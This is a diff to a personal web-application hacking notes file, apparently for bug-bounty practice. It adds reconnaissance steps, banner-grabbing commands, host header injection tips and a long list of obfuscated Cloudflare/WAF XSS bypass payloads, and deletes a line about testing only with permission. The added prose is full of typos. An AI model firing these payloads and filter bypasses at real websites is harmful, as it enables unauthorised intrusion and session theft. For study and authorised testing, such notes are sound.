@@ -46,20 +46,17 @@ curl -x 127.0.0.1:8080
 ```html
 %3cscript%3ealert%281%29%3c%2fscript%3e
 ```
-
----
-
-# Vulnerability, Impact, and Solution
+# Enumeration
 
 ## 1. Information Gathering
 
-- Learn the terminology and gather information about the server, frameworks, and default credentials.
+- has to know the terminology and gather information about the version, Server, Frameworks, and Default credentials.
 - Identify previous vulnerabilities related to the application.
 
 ### Injection Points
 
 - Where vulnerabilities can exist.
-- The location of injection vulnerabilities (parameters).
+- Injection paint is vulnerability location.(parameters)
 
 ### Information Flow
 
@@ -67,9 +64,9 @@ curl -x 127.0.0.1:8080
 2. Subdomains
 3. Select unpopular websites
 4. Find IP Address
-5. Identify programming language
+5. Which programming language they are using
 6. Open ports and services
-7. Responsible disclosure ([eur.nl](https://eur.nl))
+7. Site:eur.nl responsible disclosure
 
 ### Tools for Finding Subdomains
 
@@ -81,10 +78,14 @@ curl -x 127.0.0.1:8080
 - [Altdns](https://github.com/infosec-au/altdns)
 - [Netcraft](https://searchdns.netcraft.com/)
 - [HTTP Status Checker](https://httpstatus.io/)
+- https://github.com/projectdiscovery/subfinder
+
+sort out subdomain unpapularity (Less travel route)
 
 ### Finding IP Address & Open Ports
 
-- Use `ping` or `nmap` for aggressive scanning, OS detection, and vulnerability scanning.
+- Ping to find tha ip address or use the namp to know the open ports aggresive scanning os and version information & vuln scanning.
+- If it is not in scope do the poty numnber 80 and 443 for vulnerability scanning.
 
 ### Server Information & Banner Grabbing
 
@@ -92,19 +93,11 @@ curl -x 127.0.0.1:8080
 whatweb domain.name
 nikto -h domain.name
 nc domain.name 80
+nc head / http/1.0
+telnet
+waplayzer
 ```
-
 ---
-
-# 2. Burp Suite Certificate Configuration
-
-### Steps to Configure Burp Suite
-1. Open `http://burp`.
-2. Download CA Certificate.
-3. Go to Browser > Preferences > Certificates > View Certificate > Import > Trust all certificates.
-
----
-
 # 3. Cross-Site Scripting (XSS)
 
 ## XSS Background
@@ -124,37 +117,71 @@ nc domain.name 80
 - Search bars
 - Registration forms
 - Feedback forms
-- Contact us forms
+- Contact us forms etc....
 
 ### How to Hunt for XSS
 
-1. Find an input parameter and provide input.
-2. If input reflects or is stored, there may be XSS.
-3. Try executing JavaScript.
+1. Find an input parameter and provide input If input reflects or is stored, there may be XSS.
+2. Try executing JavaScript if you succeed to execute any javascript there then there is a XSS vulnerability.
+3. sort out all the parameters in burp-suite and check one by one or browse it through the webserver and check it here reflecting or not.
 
-### XSS Payloads
+## XSS Payloads
 
 ```html
 "><script>alert(1)</script>
 "><svg/onload=alert(1)>
 ```
+### Cloudflare XSS Bypasses
+```html
+<svg/OnLoad="`${prompt``}`">
+<svg/onload=%26nbsp;alert`bohdan`+
+1'"><img/src/onerror=.1|alert``>
+<svg onload=prompt%26%230000000040document.domain)>
+<svg onload=prompt%26%23x000000028;document.domain)>
+xss'"><iframe srcdoc='%26lt;script>;prompt`${document.domain}`%26lt;/script>'>
+<svg/onload=&#97&#108&#101&#114&#00116&#40&#41&#x2f&#x2f
+<a href="j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;&lpar;a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;(document.domain)&rpar;">X</a>
+</script><svg><script>alert(1)-%26apos%3B
+anythinglr00</script><script>alert(document.domain)</script>uxldz
+anythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxldz
+<object data='data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></object>
+<svg onload\r\n=$.globalEval("al"+"ert()");>
+?"></script><base%20c%3D=href%3Dhttps:\mysite>
+<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() x>
+<a href=javas&#99;ript:alert(1)>
+\u003e\u003c\u0068\u0031 onclick=alert('1')\u003e
+"><img src=x onerror=alert(document.cookie);.jpg
+```
+
+1. Characters ' " < > / // ( ) ^ script img svg div alert prompt 
+2. Event Handlers
 
 ### White Characters Identifying XSS
 
 - Special characters: `' " < > / // ( ) ^ script img svg div alert prompt`
 - Event Handlers:
   ```html
-  <div onpointerover="alert(45)">MOVE HERE</div>
-  <div onpointerdown="alert(45)">MOVE HERE</div>
+  Hello" onkeypress="prompt(1)
+<div onpointerover="alert(45)">MOVE HERE</div>
+<div onpointerdown="alert(45)">MOVE HERE</div>
+<div onpointerenter="alert(45)">MOVE HERE</div>
+<div onpointerleave="alert(45)">MOVE HERE</div>
+<div onpointermove="alert(45)">MOVE HERE</div>
+<div onpointerout="alert(45)">MOVE HERE</div>
+<div onpointerup="alert(45)">MOVE HERE</div>
   ```
+practise excercise: websites:
+
+https://prompt.ml/0
+http://leettime.net/xsslab1/
 
 ### Bypassing XSS Filters
 
-- UTF-8 Encoding
-- Unicode Encoding
-- HTML Encoding
-- Octal Encoding
-- Common WAF Bypass
+- Bypass using UTF-8 Encoding
+- Bypass using Unicode Encoding
+- Bypass using HTML Encoding
+- Bypass using Octal Encoding
+- Bypass using Common WAF Bypass
 
 ### Cloudflare XSS Bypass
 
@@ -169,7 +196,6 @@ nc domain.name 80
 - [XSS Lab](http://leettime.net/xsslab1/)
 
 ---
-
 # 4. Manual XSS Vector Building
 
 ## Steps to Find & Exploit XSS
@@ -292,6 +318,7 @@ Payload:
 ## 1. Overview
 - Exploiting host header injection in **virtual hosting environments**.
 - Can lead to **web cache poisoning, XSS, password reset poisoning, and internal host access**.
+- i.e 3xx and 200 status code of 300 | 301 | 302 | 303 | 304 -- 3xx is the best one for this attack for an example login page has multiple redirection request, modify any one of them
 
 ## 2. Attack Methods
 ### Method 1:
@@ -311,6 +338,8 @@ X-Forwarded-Host: bing.com
 ### Method 4:
 ```http
 Referer: https://www.bing.com/
+Try to change host and referer header because few host is verify for referer header information. 
+also do the same first three attack to insert the referer header (Change referer header)
 ```
 
 ## 3. Host Header Injection with Web Cache Poisoning
@@ -350,12 +379,6 @@ X-Forwarded-For: 127.0.0.1
 X-Remote-IP: 127.0.0.1
 X-Remote-Addr: 127.0.0.1
 ```
-
----
-
-## Summary
-This guide provides a structured approach to performing **XSS** and **Host Header Injection** attacks for security testing. Make sure to test responsibly and only on applications you have permission to test.
-
 ---
 # 4. URL Redirection (Used as a Phishing Attack) or Open Redirection
 
